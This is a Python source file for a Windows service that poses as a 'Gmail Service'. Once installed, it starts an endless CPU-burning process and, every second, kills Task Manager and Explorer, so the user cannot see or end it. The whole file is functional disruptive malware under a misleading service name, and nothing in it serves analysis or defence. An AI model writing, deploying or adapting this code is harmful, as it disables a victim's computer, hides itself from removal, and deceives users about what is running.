import threading
import win32serviceutil
import win32service
import win32event
import math
import psutil
import time
import logging
from multiprocessing import Process

class GmailService(win32serviceutil.ServiceFramework):
    _svc_name_ = "GmailService"
    _svc_display_name_ = "Gmail Service"

    def __init__(self, args):
        super().__init__(args)
        self.stop_event = win32event.CreateEvent(None, 0, 0, None)

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.stop_event)

    def SvcDoRun(self):
        self.main()

    def main(self):
            self.worker = Process(target=cpu_Killer)
            self.worker.start()

            while win32event.WaitForSingleObject(self.stop_event, 0) == win32event.WAIT_TIMEOUT:
                logging.info("Service alive")
                status1 = is_running("taskmgr.exe")
                status2 = is_running("explorer.exe")
                logging.info("Status1", status1, "\nStatus2", status2)

                if status1 == True or status2 == True:
                    kill_process("taskmgr.exe")
                    kill_process("explorer.exe")
                time.sleep(1)

def cpu_Killer():
    x = 0.1
    while True:
        x = math.sin(x) * math.cos(x) + math.cos(x) * math.sin(x) + math.sqrt(x + 1)

def is_running(process_name):
    for proc in psutil.process_iter(['name']):
        name = proc.info['name']
        if name and name.lower() == process_name.lower():
            return True
    return False

def kill_process(process_name):
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] and proc.info['name'].lower() == process_name.lower():
            proc.kill()

if __name__ == "__main__":
    win32serviceutil.HandleCommandLine(GmailService)